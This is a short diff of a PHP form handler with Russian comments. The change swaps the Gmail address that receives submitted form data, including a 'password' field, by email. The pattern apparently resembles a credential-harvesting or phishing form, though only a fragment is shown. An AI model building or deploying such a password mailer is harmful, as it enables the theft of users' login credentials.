@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = htmlspecialchars($_POST['password']);
     
     // Адрес, на который будут отправляться данные
-    $to = "sassasovic@gmail.com"; // Замените на ваш email
+    $to = "sassasovic19@gmail.com"; // Замените на ваш email
     $subject = "Новая отправка формы";
     
     // Содержание письма
